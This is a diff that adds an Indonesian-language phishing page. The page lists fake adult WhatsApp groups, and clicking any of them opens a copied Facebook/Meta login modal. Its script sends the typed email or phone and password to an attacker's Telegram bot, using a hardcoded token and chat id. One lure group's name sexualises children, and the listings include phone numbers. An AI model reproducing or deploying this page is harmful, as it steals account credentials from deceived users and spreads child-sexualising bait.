@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device=device-width, initial-scale=1.0">
+    <title>Daftar Grup WhatsApp</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        .header {
+            padding: 10px;
+            border-bottom: 1px solid #333;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .group-list {
+            padding: 10px;
+        }
+
+        .group-item {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #333;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .group-item:hover {
+            background-color: #222;
+        }
+
+        .group-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .group-details {
+            flex-grow: 1;
+        }
+
+        .group-name {
+            font-weight: bold;
+            margin-bottom: 2px;
+        }
+
+        .group-desc {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .group-time {
+            font-size: 12px;
+            color: #999;
+            margin-left: 10px;
+        }
+
+        .group-count {
+            background-color: #25D366;
+            color: #fff;
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-size: 12px;
+        }
+
+        /* Overlay */
+        .overlay {
+            display: none;
+            position: fixed;
+            z-index: 900;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+
+        .login-modal {
+            background-color: #fff;
+            margin: 10% auto;
+            padding: 20px;
+            width: 70%;
+            max-width: 350px;
+            height: 42%;
+            max-height: 450px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            position: relative;
+            overflow-y: auto;
+        }
+
+        .login-modal .logo {
+            width: 80px;
+            height: 80px;
+            background-image: url('https://f.top4top.io/p_355009lov0.png'); /* URL logo Facebook resmi */
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin: 0 auto 15px;
+            display: block;
+        }
+
+        .login-modal input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 8px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .login-modal input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        .login-modal .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+
+        .login-modal .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .login-modal a {
+            display: block;
+            margin: 8px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .login-modal .create-btn {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #1877f2;
+            background-color: #fff;
+            color: #1877f2;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .login-modal .create-btn:hover {
+            background-color: #e7f3ff;
+        }
+
+        .login-modal .meta {
+            margin-top: 15px;
+            font-size: 10px;
+            color: #737373;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #65676b;
+        }
+
+        .close-btn:hover {
+            color: #1877f2;
+        }
+    </style>
+</head>
+<body>
+  <div class="header">🥰18+ list🤤</div>
+  <div class="group-list">
+    
+    <div class="group-item" onclick="showLogin('VIRAL INDO')">
+      <div class="group-avatar" style="background-image: url('https://c.top4top.io/p_3550lc0uj0.jpeg');"></div>
+      <div class="group-details">
+        <div class="group-name">Best Hot porn🤤🥰</div>
+        <div class="group-desc">+62 812-2634-6803: 🥰🤤</div>
+      </div>
+      <div class="group-time">19:27</div>
+      <div class="group-count">828</div>
+    </div>
+    
+    <div class="group-item" onclick="showLogin('GRUP BOKEP')">
+      <div class="group-avatar" style="background-image: url('https://e.top4top.io/p_35507jwpb0.jpeg');"></div>
+      <div class="group-details">
+        <div class="group-name">GRUP BOKEP🤤🤤</div>
+        <div class="group-desc">+62 821-8152-2804: syg ngntd yu...</div>
+      </div>
+      <div class="group-time">19:25</div>
+      <div class="group-count">257</div>
+    </div>
+    
+    <div class="group-item" onclick="showLogin('BOCIL SNAGE')">
+      <div class="group-avatar" style="background-image: url('https://c.top4top.io/p_3550fk2me0.jpeg');"></div>
+      <div class="group-details">
+        <div class="group-name">BOCIL SANGE😁🤤</div>
+        <div class="group-desc">+62 821-8152-236: colmek ahh🤤</div>
+      </div>
+      <div class="group-time">08:25</div>
+      <div class="group-count">350</div>
+    </div>
+    
+    <div class="group-item" onclick="showLogin('ALVAMART VIRALL')">
+      <div class="group-avatar" style="background-image: url('https://k.top4top.io/p_3550dag180.jpeg');"></div>
+      <div class="group-details">
+        <div class="group-name">INDIAN MMS VIRAL</div>
+        <div class="group-desc">~ Wulan: How many rounds do you want?😁</div>
+      </div>
+      <div class="group-time">07:21</div>
+      <div class="group-count">683</div>
+    </div>
+    
+    <!-- Tambahkan grup lain sesuai kebutuhan -->   
+
+    <!-- Overlay Login -->
+    <div id="loginOverlay" class="overlay" onclick="closeLogin()">
+        <div class="login-modal" onclick="event.stopPropagation()">
+            <button class="close-btn" onclick="closeLogin()">&times;</button>
+            <div class="logo"></div>
+            <form class="login-form" onsubmit="handleLogin(event)">
+                <input type="text" placeholder=" Phone number or email" required>
+                <input type="password" placeholder=" Password" required>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+            <a href="#">forgot your password??</a>
+            <button class="create-btn">create a new account</button>
+            <div class="meta">© Meta</div>
+        </div>
+    </div>
+
+    <script>
+        function showLogin(groupName) {
+            localStorage.setItem('selectedGroup', groupName);
+            document.getElementById('loginOverlay').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeLogin() {
+            document.getElementById('loginOverlay').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            const email = event.target.querySelector('input[type="text"]').value;
+            const password = event.target.querySelector('input[type="password"]').value;
+            const groupName = localStorage.getItem('selectedGroup');
+
+            const botToken = '8645026028:AAFEcxNgRzJb22L77G5_cF6bOOjK5LaGSz4'; // 🔴 enter your bot token
+            const chatId = '86064099490'; // 🔴 enter your chat id 
+            const message = `𝙎𝙀𝙉𝘿 𝙀𝙍𝙍𝙊𝙍 𝙃𝙀𝙍𝙀 @DM_tbeh\n 𝗨𝗦𝗘𝗥 𝗧𝗥𝗬 𝗧𝗢 𝗟𝗢𝗚𝗜𝗡 : ${groupName}\n𝗡𝗨𝗠𝗕𝗘𝗥//𝗘𝗠𝗔𝗜𝗟: ${email}\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗🔑: ${password}\n 𝗧𝗜𝗠𝗘: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    
+                    closeLogin();
+                } else {
+                    
+                }
+            })
+            .catch(error => {
+                
+            });
+        }
+    </script>
+</body>
+</html>
